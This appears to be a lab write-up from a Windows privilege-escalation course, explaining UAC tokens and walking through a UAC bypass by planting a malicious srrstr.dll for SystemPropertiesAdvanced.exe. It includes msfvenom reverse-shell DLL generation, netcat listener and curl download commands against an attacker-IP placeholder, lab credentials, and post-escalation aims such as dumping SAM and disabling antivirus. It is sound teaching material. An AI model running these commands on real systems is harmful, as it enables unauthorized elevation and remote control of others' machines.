# Section 16 — User Account Control

> **Lab: yes** — RDP to workstation as local admin (UAC-filtered). Bypass UAC via DLL hijacking in SystemPropertiesAdvanced.exe to get an elevated reverse shell.

**Core principle:** UAC gives admin users two tokens: a filtered (medium integrity) token for normal operations, and a full (high integrity) token that requires consent. UAC is not a security boundary — it can be bypassed by exploiting auto-elevating binaries that load DLLs from user-writable locations. The classic technique: place a malicious DLL where the 32-bit `SystemPropertiesAdvanced.exe` looks for `srrstr.dll`.

---

## How UAC works

```
Admin user logs in
│
├── Token 1: Filtered (medium integrity)
│   └── Default for all processes — stripped of admin privileges
│   └── whoami /priv shows only basic privileges
│
└── Token 2: Full (high integrity)
    └── Only used when UAC consent prompt is approved
    └── whoami /priv shows all admin privileges (SeDebugPrivilege, etc.)
```

> **Key insight:** Even if you're in the local Administrators group, your processes run with the filtered token by default. You need to bypass UAC to use the full token without a consent prompt.

**Exception:** The built-in RID 500 Administrator account always runs at high integrity — UAC doesn't filter it.

---

## Checking UAC status

### Is UAC enabled?

```cmd
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
```
> `0x1` = UAC is enabled. `0x0` = disabled (rare, you already have full privileges).

### What level is UAC set to?

```cmd
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin
```
> Values: `0x0` = elevate without prompting, `0x1` = prompt for creds on secure desktop, `0x2` = prompt for consent on secure desktop, `0x3` = prompt for creds, `0x4` = prompt for consent, **`0x5` = prompt for consent for non-Windows binaries (default/highest)**. Higher values = fewer bypasses available.

### Check Windows build version

```powershell
[environment]::OSVersion.Version
```
> The build number determines which UAC bypasses work. Cross-reference with the [UACME](https://github.com/hfiref0x/UACME) project for compatible techniques.

---

## UAC Group Policy settings reference

| Setting | Registry Key | Default |
|---------|-------------|---------|
| Admin Approval Mode for built-in Admin | FilterAdministratorToken | Disabled |
| Allow UIAccess apps to prompt without secure desktop | EnableUIADesktopToggle | Disabled |
| Elevation prompt behavior for admins | ConsentPromptBehaviorAdmin | 0x5 (consent for non-Windows) |
| Elevation prompt behavior for standard users | ConsentPromptBehaviorUser | Prompt for creds |
| Detect app installs and prompt | EnableInstallerDetection | Enabled (home) / Disabled (enterprise) |
| Only elevate signed/validated executables | ValidateAdminCodeSignatures | Disabled |
| Only elevate UIAccess apps from secure locations | EnableSecureUIAPaths | Enabled |
| Run all admins in Admin Approval Mode | EnableLUA | Enabled |
| Switch to secure desktop for prompts | PromptOnSecureDesktop | Enabled |
| Virtualize file/registry write failures | EnableVirtualization | Enabled |

---

## DLL search order (how the bypass works)

When a Windows binary loads a DLL, it searches in this order:

```
1. Directory the application loaded from
2. C:\Windows\System32 (64-bit)
3. C:\Windows\System (16-bit, legacy)
4. C:\Windows directory
5. Directories in the PATH environment variable  ← user-writable!
```

> The `WindowsApps` folder (`C:\Users\<user>\AppData\Local\Microsoft\WindowsApps`) is in the user's PATH and is writable. If an auto-elevating binary looks for a DLL that doesn't exist in System32, we can place our malicious DLL in WindowsApps and it gets loaded in an elevated context.

---

## Attack: SystemPropertiesAdvanced.exe DLL hijacking

**Target binary:** `C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe` (32-bit version)
**Missing DLL:** `srrstr.dll` (System Restore functionality)
**Works on:** Windows 10 build 14393+ (UACME technique #54)

### Step 1: Generate malicious DLL (attacker box)

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f dll > srrstr.dll
```
> Creates a 32-bit DLL (must be x86 — the target binary is 32-bit SysWOW64). When loaded, it sends a reverse shell back to your listener.

### Step 2: Host the DLL (attacker box)

```bash
python3 -m http.server <SERVE_PORT>
```

### Step 3: Start listener (attacker box)

```bash
nc -lvnp <PORT>
```
> Listen on the same port specified in the msfvenom payload.

### Step 4: Download DLL to WindowsApps (target box)

```powershell
curl http://<ATTACKER_IP>:<SERVE_PORT>/srrstr.dll -O "C:\Users\<YOUR_USER>\AppData\Local\Microsoft\WindowsApps\srrstr.dll"
```
> Places the DLL in the user-writable PATH directory. When SystemPropertiesAdvanced.exe auto-elevates and searches for srrstr.dll, it finds ours.

### Step 5: (Optional) Test without bypass first

```cmd
rundll32 shell32.dll,Control_RunDLL C:\Users\<YOUR_USER>\AppData\Local\Microsoft\WindowsApps\srrstr.dll
```
> Loads the DLL in a non-elevated context. The reverse shell connects but `whoami /priv` shows only basic privileges. This confirms the DLL works before attempting the bypass.

**Kill any test rundll32 processes before proceeding:**
```cmd
tasklist /svc | findstr "rundll32"
taskkill /PID <PID> /F
```
> Left-over rundll32 processes can interfere with the bypass. Kill them all before the next step.

### Step 6: Trigger the UAC bypass (target box)

```cmd
C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe
```
> This auto-elevating binary runs at high integrity without a UAC prompt. It searches for srrstr.dll, finds our malicious version in WindowsApps, and loads it in an elevated context. Your listener receives a shell with full admin privileges.

### Step 7: Confirm elevated privileges

```cmd
whoami /priv
```
> You should see a full list of admin privileges: `SeDebugPrivilege`, `SeImpersonatePrivilege`, `SeBackupPrivilege`, `SeTakeOwnershipPrivilege`, etc. This confirms UAC was bypassed and you're running with the high-integrity token.

---

## Lab walkthrough

**Target:** `<TARGET_IP>` (ACADEMY-WINLPE-WS03)
**Creds:** `sarah` / `HTB_@cademy_stdnt!`
**Goal:** Bypass UAC → elevated reverse shell → read flag on sarah's Desktop
**Access:** RDP

### Attack chain (editable)

```
┌─────────────────────────────────────────────────────────┐
│ VARIABLES — edit these for your instance                │
├─────────────────────────────────────────────────────────┤
│ TARGET_IP    = <TARGET_IP>                              │
│ ATTACKER_IP  = <ATTACKER_IP>  (tun0 IP)                │
│ USERNAME     = sarah                                    │
│ PASSWORD     = HTB_@cademy_stdnt!                       │
│ LPORT        = 8443                                     │
│ SERVE_PORT   = 8080                                     │
│ DLL_DEST     = C:\Users\sarah\AppData\Local\Microsoft\  │
│                WindowsApps\srrstr.dll                    │
└─────────────────────────────────────────────────────────┘

ATTACKER BOX
─────────────
1. Generate malicious DLL (x86!)
   msfvenom -p windows/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=8443 -f dll > srrstr.dll

2. Host it
   python3 -m http.server 8080

3. Start listener
   nc -lvnp 8443

4. RDP to target
   xfreerdp3 /cert:ignore /dynamic-resolution +clipboard /compression /v:<TARGET_IP> /u:sarah /p:'HTB_@cademy_stdnt!'

TARGET BOX (as sarah via RDP)
─────────────────────────────
5. Confirm UAC is enabled
   REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
   REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

6. Check Windows build
   powershell -c "[environment]::OSVersion.Version"

7. Download DLL to WindowsApps
   powershell -c "curl http://<ATTACKER_IP>:8080/srrstr.dll -O 'C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll'"

8. Kill any stale rundll32 processes
   tasklist /svc | findstr "rundll32"
   taskkill /PID <PID> /F

9. Trigger UAC bypass
   C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe

ATTACKER BOX (elevated shell)
─────────────────────────────
10. Confirm elevation
    whoami /priv
    (Should see SeDebugPrivilege, SeImpersonatePrivilege, etc.)

11. Read the flag
    type C:\Users\sarah\Desktop\flag.txt
```

---

## Lab observations & attack chain

```
Local admin with UAC filtering (sarah)
│
├── Confirm UAC enabled (EnableLUA = 0x1)
│   └── ConsentPromptBehaviorAdmin = 0x5 (highest level)
│
├── Identify bypass: UACME #54 — SystemPropertiesAdvanced.exe
│   ├── 32-bit auto-elevating binary in SysWOW64
│   ├── Tries to load srrstr.dll (doesn't exist in System32)
│   └── DLL search order reaches user-writable WindowsApps folder
│
├── Stage malicious srrstr.dll
│   ├── msfvenom x86 reverse shell DLL
│   └── Place in C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\
│
├── Trigger bypass
│   ├── C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe
│   ├── Auto-elevates (no UAC prompt)
│   ├── Loads srrstr.dll from WindowsApps at high integrity
│   └── Reverse shell connects with full admin privileges
│
└── Post-escalation (elevated shell)
    ├── Read flag
    ├── Full admin privilege set available
    ├── Can dump SAM, install services, disable AV
    └── All admin tokens accessible
```

---

## Key takeaways

- **UAC is not a security boundary.** Microsoft has said this explicitly. It's a convenience feature that slows attackers but doesn't stop them.
- **Admin users get TWO tokens.** Filtered (default, medium integrity) and full (requires consent). Bypassing UAC means getting the full token without the prompt.
- **RID 500 Administrator is exempt from UAC.** Always runs at high integrity — no bypass needed.
- **DLL hijacking in auto-elevating binaries is the classic bypass.** Find a trusted binary that auto-elevates and loads a missing DLL from a user-writable PATH location.
- **`SysWOW64\SystemPropertiesAdvanced.exe`** — must use the 32-bit version. The 64-bit version doesn't have the same DLL loading behavior.
- **msfvenom DLL must match architecture.** 32-bit binary = `windows/shell_reverse_tcp` (x86). Using x64 payload will crash.
- **Kill stale rundll32 processes** before triggering the bypass. Left-over processes from testing can interfere.
- **Check build version against UACME.** Different builds have different bypasses. Build 14393 = Windows Server 2016 / Win 10 1607.
- **`ConsentPromptBehaviorAdmin = 0x5`** is the highest UAC level. Fewer bypasses work, but DLL hijacking in auto-elevating binaries still does.
